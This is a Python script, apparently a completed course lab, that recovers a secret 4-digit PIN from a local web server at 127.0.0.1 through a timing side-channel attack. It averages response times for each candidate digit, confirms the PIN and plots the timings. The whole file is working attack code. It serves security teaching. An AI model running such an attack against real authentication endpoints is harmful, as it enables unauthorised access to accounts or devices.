import sys
import time
import requests
import matplotlib.pyplot as plt
from matplotlib.patches import Patch
import numpy as np
# Target configuration
URL = "http://127.0.0.1:5000/verify"
STUDENT_ID = "123"  # TODO: Put your student id (last 3 digits)
HEADERS = {"X-Student-ID": STUDENT_ID, "Content-Type": "application/json"}

# Attack configuration parameters
PIN_LENGTH = 4
SAMPLES_PER_GUESS = 10  # Number of samples per digit to average out noise
DIGITS = "0123456789"


def measure_response_time(candidate_pin: str) -> float:
  """Sends a request to the target server and returns the elapsed time in milliseconds."""
  start_time = time.perf_counter()
  try:
    response = requests.post(
        URL, json={"pin": candidate_pin}, headers=HEADERS, timeout=5
    )
    elapsed_ms = (time.perf_counter() - start_time) * 1000
    return elapsed_ms, response.status_code
  except requests.RequestException as e:
    print(f"\n[!] Error connecting to target server: {e}")
    sys.exit(1)


def get_average_timing(candidate_pin: str, samples: int) -> tuple[float, bool]:
  """Averages response times across multiple samples to smooth out system noise."""
  
  # TODO: Request sample number of times and return average elapsed time and whether the request was a success
  if samples <= 0:
    return 0.0, False
  avg_time=0.0
  total_time=0.0
  success=False
  for i in range(samples):
    elapsed_ms, response_status_code=measure_response_time(candidate_pin)
    total_time+=elapsed_ms
    if response_status_code==200:
      success=True
  avg_time=total_time/samples
  return avg_time, success

def recover_secret_pin():
  print("=" * 60)
  print(f" Starting Timing Attack Exploit against {URL}")
  print(f" Target Student ID : {STUDENT_ID}")
  print(f" Samples per guess : {SAMPLES_PER_GUESS}")
  print("=" * 60 + "\n")
  
  known_prefix = ""
  timing_data={}
  pin_found=False

  # TODO: Use the methods to build up the secret pin
  for position in range(PIN_LENGTH):
    timing_data[position]={}
    curr_pos_best_digit=None
    curr_pos_best_time=-1.0
    position_locked=False
    confirmed_full_pin=None
    for digit in DIGITS:
      remaining_digit=PIN_LENGTH-position-1
      candidate_pin=known_prefix+digit+"0"*remaining_digit
      avg_time,success=get_average_timing(candidate_pin,SAMPLES_PER_GUESS)
      timing_data[position][candidate_pin]=avg_time
      print(f"Candidate pin = {candidate_pin} has been tried which is {success} and average time = {avg_time}")
      if success:
        # known_prefix=known_prefix+digit
        # print(f"Full pin has been matched . The pin is {known_prefix}")
        curr_pos_best_digit = digit
        confirmed_full_pin=candidate_pin
        pin_found=True
        position_locked=True
        # break

      if not position_locked and avg_time>curr_pos_best_time:
        curr_pos_best_time=avg_time
        curr_pos_best_digit=digit
      print(f"Current best time = {curr_pos_best_time} and current best digit = {curr_pos_best_digit}")

    if pin_found:
      known_prefix = confirmed_full_pin
      print(f"[+] Full PIN confirmed at position {position}: {known_prefix}\n")
      for remaining_position in range(position + 1, PIN_LENGTH):
        timing_data[remaining_position] = {}
        for digit in DIGITS:
          candidate_pin = (known_prefix[:remaining_position]+digit+known_prefix[remaining_position+1:])
          avg_time, _ = get_average_timing(candidate_pin, SAMPLES_PER_GUESS)
          timing_data[remaining_position][candidate_pin] = avg_time
      break
    else :
      known_prefix=known_prefix+curr_pos_best_digit  
      print(f"At position = {position} , the digit is {curr_pos_best_digit} and the recovered pin upto this position {known_prefix}")
  # Final verification check
  print("[*] Verifying recovered PIN with server...")
  avg_time, is_success = get_average_timing(known_prefix, samples=1)
  if is_success:
    print("\n" + "=" * 60)
    print(f"[+] VERIFIED! Recovered PIN: {known_prefix}")
    print("=" * 60)
  else:
    print("\n[-] Failed to verify recovered PIN. Consider increasing SAMPLES_PER_GUESS.")
  return known_prefix, timing_data , is_success

def retry_recover_secret_pin(max_tries=2):
  known_prefix,timing_data,is_success=None,None,None
  for attempt_no in range(max_tries):
    print(f"\n\n\nAttempt {attempt_no+1} of {max_tries}\n\n\n")
    known_prefix,timing_data,is_success=recover_secret_pin()
    if is_success:
      return known_prefix,timing_data
    print(f"\n\nAttempt {attempt_no+1} failed . The candidate pin is {known_prefix}\nRetrying-------\n")
  print(f"\n\nAll tries have been failed\n\n")
  return known_prefix,timing_data  


def plot_timing_bar_chart(timing_data):
  for position,digit_times in timing_data.items():
    candidate_pin_list=list(digit_times.keys())
    time_list=list(digit_times.values())

    plt.figure(figsize=(12,10))
    plt.barh(candidate_pin_list,time_list,color="#4C8BF5")
    plt.gca().invert_yaxis()
    plt.xlabel("Average Response Time (ms)")
    plt.title(f"Side Channel Attack — PIN Position {position}")
    plt.grid(axis="x", linestyle="--", alpha=0.4)
    plt.tight_layout()

    filename = f"position_{position}_timing.png"
    plt.savefig(filename)
    print(f"Saved chart: {filename}")
    plt.close()   



def plot_all_in_one_chart(timing_data):
  fig, ax = plt.subplots(figsize=(10, 14))
  colors = plt.cm.tab10.colors

  all_labels = []
  all_times = []
  bar_colors = []

  for position, digit_times in timing_data.items():
    for candidate_pin, avg_time in digit_times.items():
      all_labels.append(candidate_pin)
      all_times.append(avg_time)
      bar_colors.append(colors[position % len(colors)])

  y_positions = np.arange(len(all_labels)) + np.repeat(
      np.arange(len(timing_data)), [len(d) for d in timing_data.values()]
  )

  ax.barh(y_positions, all_times, color=bar_colors, height=0.8)
  ax.set_yticks(y_positions)
  ax.set_yticklabels(all_labels)
  ax.invert_yaxis()
  ax.set_xlabel("Average Response Time (ms)")
  ax.set_title("Side Channel Attack — All Positions Combined")
  ax.grid(axis="x", linestyle="--", alpha=0.4)

  legend_elements = [Patch(facecolor=colors[p % len(colors)], label=f"Position {p}")
                      for p in timing_data.keys()]
  ax.legend(handles=legend_elements, loc="lower right")

  plt.tight_layout()
  filename = "all_positions_combined.png"
  plt.savefig(filename)
  print(f"Saved combined single-axes chart: {filename}")
  plt.close()
  
if __name__ == "__main__":
  known_prefix, timing_data , is_success=recover_secret_pin()
  if not is_success:
    print("\n Now retrying to recover the pin \n")
    known_prefix,timing_data=retry_recover_secret_pin()
  plot_timing_bar_chart(timing_data)
  plot_all_in_one_chart(timing_data)
  
